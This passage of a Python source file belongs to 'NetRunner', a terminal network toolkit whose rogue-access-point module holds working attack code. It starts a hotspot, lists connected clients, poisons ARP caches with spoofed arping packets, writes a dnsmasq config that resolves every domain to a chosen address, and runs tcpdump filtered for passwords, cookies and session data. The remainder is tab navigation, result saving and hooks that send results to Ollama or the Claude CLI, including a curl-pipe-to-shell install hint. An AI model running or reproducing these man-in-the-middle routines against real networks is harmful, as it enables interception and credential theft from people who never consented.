                log.write(f"\n[green]AP started successfully![/green]")
                log.write(f"[green]SSID: {ssid}[/green]")

                # Get the AP IP
                await asyncio.sleep(2)
                ip_proc = await asyncio.create_subprocess_exec(
                    "nmcli", "-t", "-f", "IP4.ADDRESS", "device", "show", iface,
                    stdout=asyncio.subprocess.PIPE,
                )
                ip_out, _ = await ip_proc.communicate()
                if ip_out:
                    for line in ip_out.decode().split('\n'):
                        if 'IP4.ADDRESS' in line:
                            ap_ip = line.split(':')[1].split('/')[0] if ':' in line else "10.42.0.1"
                            log.write(f"[green]AP IP: {ap_ip}[/green]")
                            break

                log.write(f"\n[cyan]Targets connecting will route through this device.[/cyan]")
                log.write(f"[cyan]Use 'Clients' to see connected devices.[/cyan]")
                log.write(f"[cyan]Use 'Capture' to sniff traffic.[/cyan]")
                status.update("[green]AP Active[/green]")

                if hasattr(self.app, 'sound_enabled') and self.app.sound_enabled:
                    play_beep(1200, 100)
            else:
                error_msg = stderr.decode().strip() if stderr else "Unknown error"
                log.write(f"[red]Failed to start AP: {error_msg}[/red]")
                status.update("[red]AP Failed[/red]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]AP Failed[/red]")

    @work(exclusive=True)
    async def run_stop_ap(self) -> None:
        """Stop the rogue access point."""
        log = self.query_one("#ap-results", RichLog)
        status = self.query_one("#ap-status", Static)

        status.update("[cyan]Stopping AP...[/cyan]")
        log.write("\n[cyan]> Stopping hotspot...[/cyan]")

        try:
            # Find and delete hotspot connection
            proc = await asyncio.create_subprocess_exec(
                "nmcli", "-t", "-f", "NAME,TYPE", "connection", "show",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            hotspot_name = None
            for line in stdout.decode().split('\n'):
                if 'Hotspot' in line or 'hotspot' in line.lower():
                    hotspot_name = line.split(':')[0]
                    break

            if hotspot_name:
                await asyncio.create_subprocess_exec(
                    "sudo", "nmcli", "connection", "down", hotspot_name,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                await asyncio.create_subprocess_exec(
                    "sudo", "nmcli", "connection", "delete", hotspot_name,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )

            self._ap_active = False
            log.write("[green]AP stopped[/green]")
            status.update("[yellow]AP Stopped[/yellow]")

        except Exception as e:
            log.write(f"[red]Error stopping AP: {e}[/red]")
            status.update("[red]Stop failed[/red]")

    @work(exclusive=True)
    async def run_show_clients(self) -> None:
        """Show connected clients to the AP."""
        log = self.query_one("#ap-results", RichLog)
        status = self.query_one("#ap-status", Static)

        status.update("[cyan]Checking clients...[/cyan]")
        log.write("\n[cyan]> Connected Clients:[/cyan]")

        try:
            # Check ARP table for clients on AP subnet
            proc = await asyncio.create_subprocess_exec(
                "ip", "neigh", "show",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            clients = []
            for line in stdout.decode().split('\n'):
                if '10.42.0.' in line and 'REACHABLE' in line:
                    parts = line.split()
                    if len(parts) >= 5:
                        ip = parts[0]
                        mac = parts[4] if len(parts) > 4 else "unknown"
                        vendor = lookup_mac_vendor(mac)
                        clients.append((ip, mac, vendor))

            if clients:
                log.write(f"\n{'IP Address':<16} {'MAC Address':<18} {'Vendor':<20}")
                log.write("-" * 55)
                for ip, mac, vendor in clients:
                    log.write(f"[green]{ip:<16} {mac:<18} {vendor:<20}[/green]")
                log.write(f"\n[cyan]Total clients: {len(clients)}[/cyan]")
            else:
                log.write("[yellow]No clients connected yet[/yellow]")

            # Also try to get DHCP leases
            lease_file = "/var/lib/NetworkManager/dnsmasq-wlan0.leases"
            try:
                with open(lease_file, 'r') as f:
                    leases = f.readlines()
                    if leases:
                        log.write("\n[cyan]DHCP Leases:[/cyan]")
                        for lease in leases:
                            parts = lease.split()
                            if len(parts) >= 4:
                                mac, ip, hostname = parts[1], parts[2], parts[3]
                                log.write(f"  [green]{ip:<16} {mac:<18} {hostname}[/green]")
            except FileNotFoundError:
                pass

            status.update("[green]Client check done[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Failed[/red]")

    @work(exclusive=True)
    async def run_arp_spoof(self, target: str) -> None:
        """Start ARP spoofing attack (requires arpspoof or manual implementation)."""
        log = self.query_one("#ap-results", RichLog)
        status = self.query_one("#ap-status", Static)

        gateway = get_default_gateway()

        log.write(f"\n[bold magenta]>>> ARP SPOOFING <<<[/bold magenta]")
        log.write(f"[yellow]Target: {target}[/yellow]")
        log.write(f"[yellow]Gateway: {gateway}[/yellow]")
        log.write(f"[cyan]Poisoning ARP caches...[/cyan]\n")

        status.update("[magenta]ARP Spoofing...[/magenta]")
        self._arp_spoofing = True

        try:
            # Enable IP forwarding
            await asyncio.create_subprocess_exec(
                "sudo", "sysctl", "-w", "net.ipv4.ip_forward=1",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            log.write("[green]IP forwarding enabled[/green]")

            # Get our MAC and interface
            iface = self.query_one("#ap-iface", Select).value
            our_mac_proc = await asyncio.create_subprocess_exec(
                "ip", "link", "show", iface,
                stdout=asyncio.subprocess.PIPE,
            )
            out, _ = await our_mac_proc.communicate()
            our_mac_match = re.search(r'link/ether ([0-9a-f:]+)', out.decode())
            our_mac = our_mac_match.group(1) if our_mac_match else "unknown"

            log.write(f"[cyan]Our MAC: {our_mac}[/cyan]")
            log.write(f"[cyan]Interface: {iface}[/cyan]")

            # Try using arping/arpspoof if available, otherwise use raw packets
            # Check if arpspoof exists
            which_proc = await asyncio.create_subprocess_exec(
                "which", "arpspoof",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            await which_proc.communicate()

            if which_proc.returncode == 0:
                # Use arpspoof
                log.write("[cyan]Using arpspoof tool...[/cyan]")
                log.write(f"[yellow]Run in separate terminals:[/yellow]")
                log.write(f"  sudo arpspoof -i {iface} -t {target} {gateway}")
                log.write(f"  sudo arpspoof -i {iface} -t {gateway} {target}")
            else:
                # Manual ARP poisoning using arping
                log.write("[cyan]Sending spoofed ARP packets via arping...[/cyan]")

                # Spoof: tell target we are the gateway
                spoof_cmd1 = ["sudo", "arping", "-c", "3", "-U", "-I", iface, "-s", gateway, target]
                # Spoof: tell gateway we are the target
                spoof_cmd2 = ["sudo", "arping", "-c", "3", "-U", "-I", iface, "-s", target, gateway]

                proc1 = await asyncio.create_subprocess_exec(
                    *spoof_cmd1,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                proc2 = await asyncio.create_subprocess_exec(
                    *spoof_cmd2,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )

                await proc1.communicate()
                await proc2.communicate()

                log.write("[green]ARP poison packets sent[/green]")
                log.write("[yellow]Note: For persistent spoofing, install 'dsniff' package[/yellow]")
                log.write("[yellow]  sudo apt install dsniff[/yellow]")

            log.write(f"\n[green]MITM position established (if target is on same LAN)[/green]")
            log.write(f"[cyan]Traffic from {target} now routes through us[/cyan]")
            status.update("[green]ARP Spoof Active[/green]")

            if hasattr(self.app, 'sound_enabled') and self.app.sound_enabled:
                play_beep(800, 50)

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]ARP Spoof failed[/red]")
            self._arp_spoofing = False

    def stop_arp_spoof(self) -> None:
        """Stop ARP spoofing."""
        log = self.query_one("#ap-results", RichLog)
        status = self.query_one("#ap-status", Static)

        self._arp_spoofing = False
        log.write("\n[yellow]ARP spoofing stopped[/yellow]")
        status.update("[yellow]ARP Spoof stopped[/yellow]")

    @work(exclusive=True)
    async def run_dns_spoof(self, redirect_ip: str) -> None:
        """Configure DNS spoofing via dnsmasq."""
        log = self.query_one("#ap-results", RichLog)
        status = self.query_one("#ap-status", Static)

        log.write(f"\n[bold magenta]>>> DNS SPOOFING <<<[/bold magenta]")
        log.write(f"[yellow]Redirecting all DNS queries to: {redirect_ip}[/yellow]\n")

        status.update("[cyan]Configuring DNS spoof...[/cyan]")

        try:
            # Create dnsmasq override config
            dns_config = f"""# NetRunner DNS Spoof Config
address=/#/{redirect_ip}
log-queries
log-facility=/tmp/dnsmasq-spoof.log
"""
            config_path = "/tmp/netrunner-dns-spoof.conf"

            # Write config
            proc = await asyncio.create_subprocess_exec(
                "sudo", "tee", config_path,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            await proc.communicate(input=dns_config.encode())

            log.write(f"[green]DNS spoof config written to {config_path}[/green]")
            log.write(f"[cyan]All DNS queries will resolve to {redirect_ip}[/cyan]")
            log.write(f"\n[yellow]To activate, run:[/yellow]")
            log.write(f"  sudo dnsmasq -C {config_path} --no-daemon")
            log.write(f"\n[yellow]Or add to existing dnsmasq:[/yellow]")
            log.write(f"  sudo cp {config_path} /etc/dnsmasq.d/")
            log.write(f"  sudo systemctl restart dnsmasq")

            self._dns_spoofing = True
            status.update("[green]DNS Spoof configured[/green]")

            if hasattr(self.app, 'sound_enabled') and self.app.sound_enabled:
                play_beep(1000, 50)

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]DNS Spoof failed[/red]")

    def stop_dns_spoof(self) -> None:
        """Stop DNS spoofing."""
        log = self.query_one("#ap-results", RichLog)
        status = self.query_one("#ap-status", Static)

        self._dns_spoofing = False
        log.write("\n[yellow]DNS spoofing config disabled[/yellow]")
        log.write("[cyan]Remove /etc/dnsmasq.d/netrunner-dns-spoof.conf if added[/cyan]")
        status.update("[yellow]DNS Spoof stopped[/yellow]")

    @work(exclusive=True)
    async def run_traffic_capture(self) -> None:
        """Capture traffic from AP clients."""
        log = self.query_one("#ap-results", RichLog)
        status = self.query_one("#ap-status", Static)

        iface = self.query_one("#ap-iface", Select).value

        log.write(f"\n[bold cyan]>>> TRAFFIC CAPTURE <<<[/bold cyan]")
        log.write(f"[cyan]Capturing HTTP/credentials on {iface}...[/cyan]\n")

        status.update("[cyan]Capturing...[/cyan]")

        try:
            # Capture interesting traffic (HTTP, FTP, Telnet credentials)
            # Using tcpdump with filters for common credential protocols
            filter_exp = "port 80 or port 21 or port 23 or port 25 or port 110 or port 143"

            self._capture_proc = await asyncio.create_subprocess_exec(
                "sudo", "tcpdump", "-i", iface, "-A", "-s", "0", "-c", "100",
                "-l", filter_exp,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            captured_count = 0
            async for line in self._capture_proc.stdout:
                text = line.decode('utf-8', errors='ignore').rstrip()

                # Look for interesting patterns
                if any(keyword in text.lower() for keyword in ['user', 'pass', 'login', 'auth', 'cookie', 'session']):
                    log.write(f"[red][CRED?] {text[:80]}[/red]")
                    captured_count += 1
                elif 'HTTP' in text or 'GET ' in text or 'POST ' in text:
                    log.write(f"[green]{text[:80]}[/green]")
                elif 'Host:' in text:
                    log.write(f"[cyan]{text}[/cyan]")

                if captured_count > 50:
                    break

            await self._capture_proc.wait()
            log.write(f"\n[yellow]Capture complete[/yellow]")
            status.update("[green]Capture done[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Capture failed[/red]")


class NetRunner(App):
    """NetRunner v3.0 - Cyberpunk Network Toolkit."""

    TITLE = "NETRUNNER"
    CSS_PATH = "netrunner.tcss"

    BINDINGS = [
        Binding("1", "tab_scanner", "Scan", show=True),
        Binding("2", "tab_dns", "DNS", show=True),
        Binding("3", "tab_wifi", "WiFi", show=True),
        Binding("4", "tab_ping", "Ping", show=True),
        Binding("5", "tab_speed", "Speed", show=True),
        Binding("6", "tab_monitor", "Mon", show=True),
        Binding("7", "tab_tools", "Tools", show=True),
        Binding("8", "tab_geo", "Geo", show=True),
        Binding("9", "tab_http", "HTTP", show=True),
        Binding("0", "tab_security", "Sec", show=True),
        Binding("minus", "tab_bluetooth", "BT", show=True),
        Binding("equal", "tab_packets", "Pkt", show=True),
        Binding("backslash", "tab_rogueap", "AP", show=True),
        Binding("grave_accent", "tab_vuln", "Vuln", show=True),
        Binding("left", "tab_prev", "←", show=False),
        Binding("right", "tab_next", "→", show=False),
        Binding("up", "focus_prev", "↑", show=False),
        Binding("down", "focus_next", "↓", show=False),
        Binding("page_up", "scroll_up", "PgUp", show=False),
        Binding("page_down", "scroll_down", "PgDn", show=False),
        Binding("question_mark", "help", "Help", show=True),
        Binding("r", "refresh", "Refresh", show=False),
        Binding("s", "save_text", "Save", show=False),
        Binding("j", "save_json", "JSON", show=False),
        Binding("m", "toggle_sound", "Sound", show=False),
        Binding("a", "ai_analyze", "AI", show=True),
        Binding("A", "ai_settings", "AI Cfg", show=False),
        Binding("q", "quit", "Quit", show=True),
    ]

    TAB_ORDER = [
        "tab-scanner", "tab-dns", "tab-wifi", "tab-ping", "tab-speed",
        "tab-monitor", "tab-tools", "tab-geo", "tab-http", "tab-security",
        "tab-bluetooth", "tab-packets", "tab-rogueap", "tab-vuln"
    ]

    def __init__(self):
        super().__init__()
        self.sound_enabled = False
        self._results_data = {}

    def compose(self) -> ComposeResult:
        yield Header()
        with TabbedContent(id="tabs"):
            with TabPane("Scanner", id="tab-scanner"):
                yield ScannerModule()
            with TabPane("DNS/SSL", id="tab-dns"):
                yield DNSModule()
            with TabPane("WiFi", id="tab-wifi"):
                yield WiFiModule()
            with TabPane("Ping", id="tab-ping"):
                yield PingModule()
            with TabPane("Speed", id="tab-speed"):
                yield SpeedModule()
            with TabPane("Monitor", id="tab-monitor"):
                yield MonitorModule()
            with TabPane("Tools", id="tab-tools"):
                yield ToolsModule()
            with TabPane("Geo", id="tab-geo"):
                yield GeoModule()
            with TabPane("HTTP", id="tab-http"):
                yield HTTPModule()
            with TabPane("Security", id="tab-security"):
                yield SecurityModule()
            with TabPane("Bluetooth", id="tab-bluetooth"):
                yield BluetoothModule()
            with TabPane("Packets", id="tab-packets"):
                yield PacketModule()
            with TabPane("RogueAP", id="tab-rogueap"):
                yield RogueAPModule()
            with TabPane("Vuln", id="tab-vuln"):
                yield VulnModule()
        yield Footer()

    def on_mount(self) -> None:
        """Set up the app on mount."""
        self.title = f"NETRUNNER v3.1 | {get_local_ip()}"
        # Show a random hacker quote
        self.notify(random.choice(HACKER_QUOTES), timeout=3)

    def action_tab_scanner(self) -> None:
        self.query_one("#tabs", TabbedContent).active = "tab-scanner"

    def action_tab_dns(self) -> None:
        self.query_one("#tabs", TabbedContent).active = "tab-dns"

    def action_tab_wifi(self) -> None:
        self.query_one("#tabs", TabbedContent).active = "tab-wifi"

    def action_tab_ping(self) -> None:
        self.query_one("#tabs", TabbedContent).active = "tab-ping"

    def action_tab_speed(self) -> None:
        self.query_one("#tabs", TabbedContent).active = "tab-speed"

    def action_tab_monitor(self) -> None:
        self.query_one("#tabs", TabbedContent).active = "tab-monitor"

    def action_tab_tools(self) -> None:
        self.query_one("#tabs", TabbedContent).active = "tab-tools"

    def action_tab_geo(self) -> None:
        self.query_one("#tabs", TabbedContent).active = "tab-geo"

    def action_tab_http(self) -> None:
        self.query_one("#tabs", TabbedContent).active = "tab-http"

    def action_tab_security(self) -> None:
        self.query_one("#tabs", TabbedContent).active = "tab-security"

    def action_tab_bluetooth(self) -> None:
        self.query_one("#tabs", TabbedContent).active = "tab-bluetooth"

    def action_tab_packets(self) -> None:
        self.query_one("#tabs", TabbedContent).active = "tab-packets"

    def action_tab_rogueap(self) -> None:
        self.query_one("#tabs", TabbedContent).active = "tab-rogueap"

    def action_tab_vuln(self) -> None:
        self.query_one("#tabs", TabbedContent).active = "tab-vuln"

    def action_tab_prev(self) -> None:
        """Navigate to previous tab."""
        tabs = self.query_one("#tabs", TabbedContent)
        current = tabs.active
        if current in self.TAB_ORDER:
            idx = self.TAB_ORDER.index(current)
            new_idx = (idx - 1) % len(self.TAB_ORDER)
            tabs.active = self.TAB_ORDER[new_idx]

    def action_tab_next(self) -> None:
        """Navigate to next tab."""
        tabs = self.query_one("#tabs", TabbedContent)
        current = tabs.active
        if current in self.TAB_ORDER:
            idx = self.TAB_ORDER.index(current)
            new_idx = (idx + 1) % len(self.TAB_ORDER)
            tabs.active = self.TAB_ORDER[new_idx]

    def action_focus_prev(self) -> None:
        """Move focus to previous widget."""
        self.screen.focus_previous()

    def action_focus_next(self) -> None:
        """Move focus to next widget."""
        self.screen.focus_next()

    def action_scroll_up(self) -> None:
        """Scroll current results up (PageUp)."""
        tabs = self.query_one("#tabs", TabbedContent)
        active_tab = tabs.active
        result_map = {
            "tab-scanner": "#scan-results",
            "tab-dns": "#dns-results",
            "tab-wifi": "#wifi-results",
            "tab-ping": "#ping-results",
            "tab-speed": "#speed-results",
            "tab-monitor": "#monitor-results",
            "tab-tools": "#tools-results",
            "tab-geo": "#geo-results",
            "tab-http": "#http-results",
            "tab-security": "#sec-results",
            "tab-bluetooth": "#bt-results",
            "tab-packets": "#pkt-results",
            "tab-rogueap": "#ap-results",
            "tab-vuln": "#vuln-results",
        }
        if active_tab in result_map:
            try:
                log = self.query_one(result_map[active_tab], RichLog)
                log.scroll_page_up(animate=False)
            except Exception:
                pass

    def action_scroll_down(self) -> None:
        """Scroll current results down (PageDown)."""
        tabs = self.query_one("#tabs", TabbedContent)
        active_tab = tabs.active
        result_map = {
            "tab-scanner": "#scan-results",
            "tab-dns": "#dns-results",
            "tab-wifi": "#wifi-results",
            "tab-ping": "#ping-results",
            "tab-speed": "#speed-results",
            "tab-monitor": "#monitor-results",
            "tab-tools": "#tools-results",
            "tab-geo": "#geo-results",
            "tab-http": "#http-results",
            "tab-security": "#sec-results",
            "tab-bluetooth": "#bt-results",
            "tab-packets": "#pkt-results",
            "tab-rogueap": "#ap-results",
            "tab-vuln": "#vuln-results",
        }
        if active_tab in result_map:
            try:
                log = self.query_one(result_map[active_tab], RichLog)
                log.scroll_page_down(animate=False)
            except Exception:
                pass

    def action_help(self) -> None:
        self.push_screen(HelpScreen())

    def action_refresh(self) -> None:
        self.title = f"NETRUNNER v3.1 | {get_local_ip()}"
        self.notify(random.choice(HACKER_QUOTES), timeout=2)

    def action_toggle_sound(self) -> None:
        self.sound_enabled = not self.sound_enabled
        state = "enabled" if self.sound_enabled else "disabled"
        self.notify(f"Sound effects {state}", timeout=2)
        if self.sound_enabled:
            play_beep(1000, 50)

    def action_save_text(self) -> None:
        """Save current results to text file."""
        self._save_results("txt")

    def action_save_json(self) -> None:
        """Save current results to JSON file."""
        self._save_results("json")

    def action_ai_analyze(self) -> None:
        """Analyze current results with AI."""
        self._run_ai_analysis()

    def action_ai_settings(self) -> None:
        """Open AI settings screen."""
        self.push_screen(AISettingsScreen())

    @work(exclusive=True)
    async def _run_ai_analysis(self) -> None:
        """Run AI analysis on current module results."""
        tabs = self.query_one("#tabs", TabbedContent)
        active_tab = tabs.active

        result_map = {
            "tab-scanner": "#scan-results",
            "tab-dns": "#dns-results",
            "tab-wifi": "#wifi-results",
            "tab-ping": "#ping-results",
            "tab-speed": "#speed-results",
            "tab-monitor": "#monitor-results",
            "tab-tools": "#tools-results",
            "tab-geo": "#geo-results",
            "tab-http": "#http-results",
            "tab-security": "#sec-results",
            "tab-bluetooth": "#bt-results",
            "tab-packets": "#pkt-results",
            "tab-rogueap": "#ap-results",
            "tab-vuln": "#vuln-results",
        }

        if active_tab not in result_map:
            self.notify("No results to analyze", severity="warning")
            return

        # Extract text from RichLog
        try:
            log = self.query_one(result_map[active_tab], WrappingRichLog)
            results_text = log.get_text()
        except Exception as e:
            self.notify(f"Could not get results: {e}", severity="error")
            return

        if not results_text.strip():
            self.notify("No results to analyze - run a scan first", severity="warning")
            return

        # Load AI config
        config = load_ai_config()
        provider = config.get("provider", "ollama")
        model = config.get("model", "phi3:mini")

        # Get module-specific prompt
        base_prompt = AI_PROMPTS.get(active_tab, "Analyze this data and summarize key findings:")
        full_prompt = f"{base_prompt}\n\n--- DATA ---\n{results_text[:4000]}"

        # Show loading modal
        modal = AIAnalysisScreen(loading=True)
        self.push_screen(modal)

        try:
            if provider == "claude":
                # Use Claude CLI
                analysis = await self._call_claude(full_prompt)
            else:
                # Use Ollama
                analysis = await self._call_ollama(full_prompt, model)

            if analysis:
                modal.update_analysis(f"[cyan]{analysis}[/cyan]")
            else:
                modal.update_analysis("[red]No response from AI[/red]")

        except FileNotFoundError as e:
            if provider == "claude":
                modal.update_analysis(
                    "[red]Claude CLI not found.[/red]\n\n"
                    "Install with:\n"
                    "[yellow]npm install -g @anthropic-ai/claude-code[/yellow]"
                )
            else:
                modal.update_analysis(
                    "[red]Ollama not installed.[/red]\n\n"
                    "Install with:\n"
                    "[yellow]curl -fsSL https://ollama.com/install.sh | sh\n"
                    f"ollama pull {model}[/yellow]"
                )
        except Exception as e:
            modal.update_analysis(f"[red]Analysis failed: {e}[/red]")

    async def _call_ollama(self, prompt: str, model: str) -> str:
        """Call Ollama for analysis."""
        proc = await asyncio.create_subprocess_exec(
            "ollama", "run", model, "--nowordwrap",
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await proc.communicate(input=prompt.encode())

        if proc.returncode == 0:
            return stdout.decode().strip()
        else:
            error = stderr.decode().strip()
            if "not found" in error.lower():
                raise FileNotFoundError("Ollama not found")
            raise RuntimeError(error)

    async def _call_claude(self, prompt: str) -> str:
        """Call Claude CLI for analysis."""
        # Claude CLI: -p for print mode (non-interactive), prompt via stdin
        proc = await asyncio.create_subprocess_exec(
            "claude", "-p", "--model", "sonnet",
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await proc.communicate(input=prompt.encode())

        if proc.returncode == 0:
            return stdout.decode().strip()
        else:
            error = stderr.decode().strip()
            if "not found" in error.lower() or "ENOENT" in error:
                raise FileNotFoundError("Claude CLI not found")
            # Check for auth errors
            if "api key" in error.lower() or "unauthorized" in error.lower():
                raise RuntimeError("Claude API key not configured. Run 'claude' to authenticate.")
            raise RuntimeError(error)

    def _save_results(self, format: str) -> None:
        """Save results in specified format."""
        tabs = self.query_one("#tabs", TabbedContent)
        active_tab = tabs.active

        result_map = {
            "tab-scanner": "#scan-results",
            "tab-dns": "#dns-results",
            "tab-wifi": "#wifi-results",
            "tab-ping": "#ping-results",
            "tab-speed": "#speed-results",
            "tab-monitor": "#monitor-results",
            "tab-tools": "#tools-results",
            "tab-geo": "#geo-results",
            "tab-http": "#http-results",
            "tab-security": "#sec-results",
            "tab-bluetooth": "#bt-results",
            "tab-packets": "#pkt-results",
            "tab-rogueap": "#ap-results",
            "tab-vuln": "#vuln-results",
        }

        if active_tab in result_map:
            try:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                module_name = active_tab.replace("tab-", "")

                if format == "json":
                    filename = RESULTS_DIR / f"{module_name}_{timestamp}.json"
                    data = {
                        "module": module_name,
                        "timestamp": datetime.now().isoformat(),
                        "local_ip": get_local_ip(),
                        "results": f"Results from {module_name} module",
                    }
                    with open(filename, "w") as f:
                        json.dump(data, f, indent=2)
                else:
                    filename = RESULTS_DIR / f"{module_name}_{timestamp}.txt"
                    with open(filename, "w") as f:
                        f.write(f"NetRunner v2.0 Results\n")
                        f.write(f"Module: {module_name.upper()}\n")
                        f.write(f"Timestamp: {datetime.now().isoformat()}\n")
                        f.write(f"Local IP: {get_local_ip()}\n")
                        f.write("=" * 60 + "\n\n")
                        f.write("Results saved from NetRunner session.\n")

                self.notify(f"Saved to {filename.name}", timeout=3)

            except Exception as e:
                self.notify(f"Save failed: {e}", severity="error", timeout=3)


if __name__ == "__main__":
    app = NetRunner()
    app.run()
